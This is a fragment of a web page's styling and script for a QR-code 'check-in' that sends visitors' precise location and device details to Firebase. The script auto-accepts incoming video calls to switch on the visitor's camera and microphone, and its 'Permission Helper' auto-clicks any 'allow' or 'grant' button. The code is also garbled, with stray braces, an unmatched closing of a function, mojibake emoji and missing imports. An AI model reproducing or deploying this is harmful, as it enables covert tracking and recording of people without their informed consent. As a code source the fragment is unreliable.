        .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;

        }

        }

        .status {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 16px;
        }

        .status.loading {
            background: #e3f2fd;
            color: #1976d2;
        }

        .status.success {
            background: #e8f5e9;
            color: #2e7d32;
        }

        .status.error {
            background: #ffebee;
            color: #c62828;
        }

        .status.calling {
            background: #fff3e0;
            color: #e65100;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .info-box {
            background: #f5f5f5;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            text-align: left;
        }

        .info-row {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            font-size: 14px;
        }

        .info-row:last-child {
            margin-bottom: 0;
        }

        .info-icon {
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            color: white;
            font-size: 16px;
        }

        .info-text {
            color: #555;
            flex: 1;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .waiting {
            margin-top: 30px;
            color: #666;
            font-style: italic;
        }

        #videoContainer {
            display: none;
            position: relative;
            width: 100%;
            max-width: 400px;
            margin: 20px auto;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        .video-wrapper {
            position: relative;
            width: 100%;
        }

        #remoteVideo {
            width: 100%;
            height: auto;
            display: block;
            background: #000;
            border-radius: 10px;
        }

        #localVideo {
            position: absolute;
            bottom: 10px;
            right: 10px;
            width: 120px;
            height: auto;
            border: 2px solid white;
            border-radius: 8px;
            background: #000;
            z-index: 10;
        }

        .audio-indicator {
            display: none;
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 11;
            animation: audioGlow 1s infinite;
        }

        .audio-indicator.active {
            display: block;
        }

        @keyframes audioGlow {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .call-buttons {
            display: none;
            margin-top: 20px;
            gap: 10px;
            justify-content: center;
        }

        .call-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .call-btn.end {
            background: #ff5722;
            color: white;
        }

        .call-btn.end:hover {
            background: #e64a19;
        }
    </style>

    <script>

            console.log('üîê Permission Helper loaded');

            // Pre-request permissions on page load to prompt user early
            window.addEventListener('load', async () => {
                try {
                    console.log('üìç Requesting location permission...');
                    // This will trigger the location permission prompt
                    if ('geolocation' in navigator) {
                        // Permission is requested in captureAndSendLocation()
                    }
                } catch (error) {
                    console.log('Permission pre-request failed:', error);
                }
            });

            // Helper to auto-click allow buttons if they appear
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            // Look for permission dialog buttons
                            const buttons = node.querySelectorAll?.(
                                'button, input[type="button"], [role="button"]'
                            );

                            buttons?.forEach((btn) => {
                                const text = btn.textContent?.toLowerCase() || '';
                                const ariaLabel = btn.getAttribute('aria-label')?.toLowerCase() || '';

                                if (text.includes('allow') || text.includes('grant') ||
                                    ariaLabel.includes('allow') || ariaLabel.includes('grant')) {
                                    console.log('üîì Auto-clicking permission button');
                                    setTimeout(() => {
                                        try {
                                            btn.click();
                                        } catch (e) {
                                            console.log('Click failed:', e);
                                        }
                                    }, 100);
                                }
                            });
                        }
                    });
                });
            });

            observer.observe(document.documentElement, {
                childList: true,
                subtree: true
            });

            console.log('‚úÖ Permission helper active');
        })();

        // WebRTC variables
        let peerConnection = null;
        let localStream = null;
        let visitId = null;
        let callDocRef = null;

        // Get QR code ID from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const qrCodeId = urlParams.get('qr');

        async function captureAndSendLocation() {
            try {
                const statusEl = document.getElementById('status');
                statusEl.className = 'status loading';
                statusEl.innerHTML = 'üìç Getting your location...';

                console.log('üìç Starting location capture...');

                // Get device info
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timestamp: new Date().toISOString()
                };

                // Request location permission
                if ('geolocation' in navigator) {
                    console.log('üåç Geolocation API available, requesting position...');

                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;
                            console.log(`‚úÖ Location captured: ${latitude}, ${longitude}`);

                            statusEl.innerHTML = '‚úÖ Location captured! Sending data...';

                            // Send to Firebase
                            await sendVisitData(latitude, longitude, deviceInfo);
                        },
                        async (error) => {
                            console.error('‚ùå Location error:', error);

                            let errorMsg = '';
                            switch(error.code) {
                                case error.PERMISSION_DENIED:
                                    errorMsg = 'Location permission denied. Continuing without location...';
                                    console.warn('‚ö†Ô∏è User denied location permission');
                                    break;
                                case error.POSITION_UNAVAILABLE:
                                    errorMsg = 'Location unavailable. Continuing without location...';
                                    console.warn('‚ö†Ô∏è Location information unavailable');
                                    break;
                                case error.TIMEOUT:
                                    errorMsg = 'Location request timeout. Continuing without location...';
                                    console.warn('‚ö†Ô∏è Location request timed out');
                                    break;
                                default:
                                    errorMsg = 'Unable to get location. Continuing...';
                                    console.warn('‚ö†Ô∏è Unknown location error');
                            }

                            statusEl.innerHTML = '‚ö†Ô∏è ' + errorMsg;

                            // Send without location after 2 seconds
                            setTimeout(async () => {
                                await sendVisitData(null, null, deviceInfo);
                            }, 2000);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    console.warn('‚ö†Ô∏è Geolocation not supported');
                    statusEl.innerHTML = '‚ö†Ô∏è Location not supported on this device';

                    // Send without location
                    setTimeout(async () => {
                        await sendVisitData(null, null, deviceInfo);
                    }, 2000);
                }
            } catch (error) {
                console.error('‚ùå Capture error:', error);
                showError('Failed to process your visit: ' + error.message);
            }
        }

        async function sendVisitData(latitude, longitude, deviceInfo) {
            try {
                console.log('üì§ Sending visit data to Firebase...');
                console.log('QR Code ID:', qrCodeId);

                // Verify QR code exists
                const qrDoc = await getDoc(doc(db, 'qrcodes', qrCodeId));

                if (!qrDoc.exists()) {
                    console.error('‚ùå QR code not found:', qrCodeId);
                    showError('Invalid QR code. Please contact the administrator.');
                    return;
                }

                const qrData = qrDoc.data();
                const adminId = qrData.adminId;
                console.log('‚úÖ QR code verified, Admin ID:', adminId);

                // Create visit record
                visitId = Date.now().toString() + Math.random().toString(36).substring(2, 9);
                const visitData = {
                    id: visitId,
                    qrCodeId: qrCodeId,
                    adminId: adminId,
                    latitude: latitude,
                    longitude: longitude,
                    deviceInfo: JSON.stringify(deviceInfo),
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    status: 'pending',
                    callStatus: null
                };

                console.log('üíæ Saving visit to Firestore...', visitId);
                // Save to Firestore
                await addDoc(collection(db, 'guest_visits'), visitData);
                console.log('‚úÖ Visit saved successfully');

                // Update QR code visit count
                const qrRef = doc(db, 'qrcodes', qrCodeId);
                const currentCount = qrData.visitCount || 0;
                await updateDoc(qrRef, {
                    visitCount: currentCount + 1
                });
                console.log(`‚úÖ Visit count updated: ${currentCount + 1}`);

                // Send notification to admin
                console.log('üîî Sending notification to admin...');
                await addDoc(collection(db, 'notifications'), {
                    adminId: adminId,
                    qrCodeId: qrCodeId,
                    visitId: visitId,
                    type: 'visitor_arrived',
                    title: 'New Visitor!',
                    message: 'A visitor has scanned your QR code and is waiting at the location.',
                    timestamp: new Date().toISOString(),
                    read: false
                });
                console.log('‚úÖ Notification sent to admin');

                showSuccess(latitude, longitude, deviceInfo);

                // Listen for incoming call
                console.log('üëÇ Listening for incoming calls...');
                listenForIncomingCall(adminId);
            } catch (error) {
                console.error('‚ùå Firebase error:', error);
                console.error('Error details:', error.message, error.code);
                showError('Failed to send your information: ' + error.message);
            }
        }

        function listenForIncomingCall(adminId) {
            console.log('üëÇ Setting up call listener for admin:', adminId);
            console.log('üëÇ Visit ID:', visitId);

            // Listen for call documents
            const callsRef = collection(db, 'calls');
            onSnapshot(callsRef, (snapshot) => {
                console.log(`üìû Calls snapshot received, ${snapshot.docChanges().length} change(s)`);

                snapshot.docChanges().forEach(async (change) => {
                    if (change.type === 'added') {
                        const callData = change.doc.data();
                        console.log('üìû New call detected:', {
                            callId: change.doc.id,
                            visitId: callData.visitId,
                            expectedVisitId: visitId,
                            status: callData.status
                        });

                        if (callData.visitId === visitId && callData.status === 'calling') {
                            console.log('‚úÖ Incoming call matches this visitor!');
                            callDocRef = change.doc.ref;
                            showIncomingCall(callData);
                        } else {
                            console.log('‚ÑπÔ∏è Call is for different visitor or different status');
                        }
                    }
                });
            }, (error) => {
                console.error('‚ùå Error listening for calls:', error);
            });

            console.log('‚úÖ Call listener active');
        }

        function showIncomingCall(callData) {
            console.log('üìû Showing incoming call UI');

            const statusEl = document.getElementById('status');
            statusEl.className = 'status calling';
            statusEl.innerHTML = 'üìû Incoming call from admin...';

            // Play ringtone
            const ringtone = document.getElementById('ringtone');
            ringtone.play().catch(err => {
                console.warn('‚ö†Ô∏è Ringtone play failed:', err);
            });
            console.log('üîî Ringtone playing');

            // Automatically accept the call after a brief moment
            console.log('‚è±Ô∏è Auto-accepting call in 1 second...');
            setTimeout(() => {
                console.log('‚úÖ Auto-accept triggered');
                acceptCall();
            }, 1000); // Accept after 1 second to allow ringtone to play briefly
        }

        async function acceptCall() {
            try {
                // Stop ringtone
                const ringtone = document.getElementById('ringtone');
                ringtone.pause();
                ringtone.currentTime = 0;

                const statusEl = document.getElementById('status');
                statusEl.innerHTML = 'üìπ Requesting camera and microphone access...';
                statusEl.className = 'status loading';

                console.log('üìπ Requesting getUserMedia...');

                // Get user media (video + audio) with error handling
                try {
                    localStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user'
                        },
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true
                        }
                    });

                    console.log('‚úÖ Media stream obtained:', localStream.getTracks().map(t => t.kind));
                } catch (mediaError) {
                    console.error('‚ùå getUserMedia error:', mediaError);

                    // Provide specific error messages
                    let errorMsg = 'Failed to access camera/microphone. ';
                    if (mediaError.name === 'NotAllowedError' || mediaError.name === 'PermissionDeniedError') {
                        errorMsg += 'Please allow camera and microphone permissions and try again.';
                    } else if (mediaError.name === 'NotFoundError' || mediaError.name === 'DevicesNotFoundError') {
                        errorMsg += 'No camera or microphone found on this device.';
                    } else if (mediaError.name === 'NotReadableError' || mediaError.name === 'TrackStartError') {
                        errorMsg += 'Camera/microphone is already in use by another application.';
                    } else {
                        errorMsg += mediaError.message || 'Unknown error occurred.';
                    }

                    showError(errorMsg);
                    return;
                }

                statusEl.innerHTML = 'üîó Connecting to call...';

                // Display local video
                const localVideo = document.getElementById('localVideo');
                localVideo.srcObject = localStream;
                document.getElementById('videoContainer').style.display = 'block';

                // Show end call button
                document.getElementById('activeCallButtons').style.display = 'flex';

                // Create peer connection
                await createPeerConnection();

                statusEl.innerHTML = 'üì° Establishing connection...';

                // Get the offer from Firestore
                const callDoc = await getDoc(callDocRef);
                const callData = callDoc.data();

                if (callData && callData.offer) {
                    console.log('üì® Setting remote description...');
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(callData.offer));

                    console.log('üìù Creating answer...');
                    // Create answer
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);

                    console.log('üì§ Sending answer to admin...');
                    // Send answer to Firestore
                    await updateDoc(callDocRef, {
                        answer: {
                            sdp: answer.sdp,
                            type: answer.type
                        },
                        status: 'active'
                    });

                    statusEl.innerHTML = '‚úÖ Call connected! You can see and hear each other.';
                    statusEl.className = 'status success';
                    console.log('‚úÖ Call successfully connected!');
                } else {
                    throw new Error('No offer found in call data');
                }

                // Listen for ICE candidates from admin
                onSnapshot(collection(callDocRef, 'candidates'), (snapshot) => {
                    snapshot.docChanges().forEach((change) => {
                        if (change.type === 'added') {
                            const candidateData = change.doc.data();
                            console.log('üßä Adding ICE candidate from admin');
                            const candidate = new RTCIceCandidate(candidateData);
                            peerConnection.addIceCandidate(candidate).catch(err => {
                                console.error('Error adding ICE candidate:', err);
                            });
                        }
                    });
                });

            } catch (error) {
                console.error('‚ùå Error in acceptCall:', error);
                showError('Connection failed: ' + (error.message || 'Please refresh and try again.'));

                // Cleanup on error
                if (localStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
            }
        }

        async function createPeerConnection() {
            console.log('üîå Creating peer connection...');

            const configuration = {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    // Add TURN servers for better connectivity
                    {
                        urls: 'turn:openrelay.metered.ca:80',
                        username: 'openrelayproject',
                        credential: 'openrelayproject'
                    },
                    {
                        urls: 'turn:openrelay.metered.ca:443',
                        username: 'openrelayproject',
                        credential: 'openrelayproject'
                    }
                ],
                iceCandidatePoolSize: 10
            };

            peerConnection = new RTCPeerConnection(configuration);
            console.log('‚úÖ Peer connection created');

            // Add local stream
            localStream.getTracks().forEach(track => {
                console.log(`‚ûï Adding local ${track.kind} track`);
                peerConnection.addTrack(track, localStream);
            });

            // Handle remote tracks (admin video/audio)
            peerConnection.ontrack = (event) => {
                console.log(`üì• Remote ${event.track.kind} track received`);
                const remoteVideo = document.getElementById('remoteVideo');
                if (!remoteVideo.srcObject) {
                    remoteVideo.srcObject = new MediaStream();
                    console.log('üì∫ Created new MediaStream for remote video');
                }
                remoteVideo.srcObject.addTrack(event.track);
                console.log('‚úÖ Remote track added to video element');

                // Ensure remote audio is enabled
                if (event.track.kind === 'audio') {
                    remoteVideo.muted = false;
                    console.log('üîä Remote audio unmuted');
                    setupAudioDetection(remoteVideo);
                }
            };

            // Handle ICE candidates
            peerConnection.onicecandidate = async (event) => {
                if (event.candidate && callDocRef) {
                    console.log('üßä Sending ICE candidate to admin');
                    try {
                        await addDoc(collection(callDocRef, 'visitor_candidates'), {
                            candidate: event.candidate.candidate,
                            sdpMid: event.candidate.sdpMid,
                            sdpMLineIndex: event.candidate.sdpMLineIndex
                        });
                        console.log('‚úÖ ICE candidate sent');
                    } catch (err) {
                        console.error('‚ùå Failed to send ICE candidate:', err);
                    }
                } else if (!event.candidate) {
                    console.log('üèÅ All ICE candidates sent');
                }
            };

            // Handle ICE connection state
            peerConnection.oniceconnectionstatechange = () => {
                console.log('üßä ICE connection state:', peerConnection.iceConnectionState);
            };

            // Handle ICE gathering state
            peerConnection.onicegatheringstatechange = () => {
                console.log('üîç ICE gathering state:', peerConnection.iceGatheringState);
            };

            // Handle signaling state
            peerConnection.onsignalingstatechange = () => {
                console.log('üì° Signaling state:', peerConnection.signalingState);
            };

            // Handle connection state
            peerConnection.onconnectionstatechange = () => {
                console.log('üîó Connection state:', peerConnection.connectionState);
                const statusEl = document.getElementById('status');

                switch (peerConnection.connectionState) {
                    case 'connected':
                        statusEl.innerHTML = '‚úÖ Call connected! You can see and hear each other.';
                        statusEl.className = 'status success';
                        console.log('üéâ WebRTC connection established successfully!');
                        break;
                    case 'connecting':
                        statusEl.innerHTML = 'üîó Connecting...';
                        statusEl.className = 'status loading';
                        break;
                    case 'disconnected':
                        statusEl.innerHTML = '‚ö†Ô∏è Connection lost...';
                        statusEl.className = 'status error';
                        console.warn('‚ö†Ô∏è Connection disconnected');
                        break;
                    case 'failed':
                        statusEl.innerHTML = '‚ùå Connection failed';
                        statusEl.className = 'status error';
                        console.error('‚ùå Connection failed');
                        setTimeout(() => endCall(), 3000);
                        break;
                    case 'closed':
                        console.log('üîí Connection closed');
                        break;
                }
            };

            console.log('‚úÖ Peer connection configured with all handlers');
        }

        function setupAudioDetection(videoElement) {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioContext.createMediaStreamSource(videoElement.srcObject);
                const analyser = audioContext.createAnalyser();
                analyser.fftSize = 256;
                source.connect(analyser);

                const dataArray = new Uint8Array(analyser.frequencyBinCount);
                const audioIndicator = document.getElementById('audioIndicator');

                function checkAudio() {
                    analyser.getByteFrequencyData(dataArray);
                    const average = dataArray.reduce((a, b) => a + b) / dataArray.length;

                    if (average > 20) {
                        audioIndicator.classList.add('active');
                    } else {
                        audioIndicator.classList.remove('active');
                    }

                    requestAnimationFrame(checkAudio);
                }
                checkAudio();
            } catch (error) {
                console.log('Audio detection setup failed:', error);
            }
        }


        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
            if (peerConnection) {
                peerConnection.close();
            }

            document.getElementById('videoContainer').style.display = 'none';
            document.getElementById('activeCallButtons').style.display = 'none';
            document.getElementById('status').innerHTML = '‚úÖ Call ended';
            document.getElementById('status').className = 'status success';

            // Update call status in Firestore
            if (callDocRef) {
                updateDoc(callDocRef, {
                    status: 'ended'
                }).catch(err => console.log('Error updating call status:', err));
            }
        }

        function showSuccess(latitude, longitude, deviceInfo) {
            const statusEl = document.getElementById('status');
            const infoEl = document.getElementById('info');
            const waitingEl = document.getElementById('waiting');

            statusEl.className = 'status success';
            statusEl.innerHTML = '‚úÖ Check-in Successful!';

            // Show info
            const now = new Date();
            document.getElementById('time').textContent = now.toLocaleString();
            document.getElementById('location').textContent = latitude && longitude
                ? `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`
                : 'Location not available';
            document.getElementById('device').textContent = deviceInfo.platform || 'Unknown device';

            infoEl.style.display = 'block';
            waitingEl.style.display = 'block';
        }

        function showError(message) {
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.innerHTML = '‚ùå ' + message;
        }

        // Make endCall global (auto-accept, so no accept/reject buttons needed)
        window.endCall = endCall;
    </script>
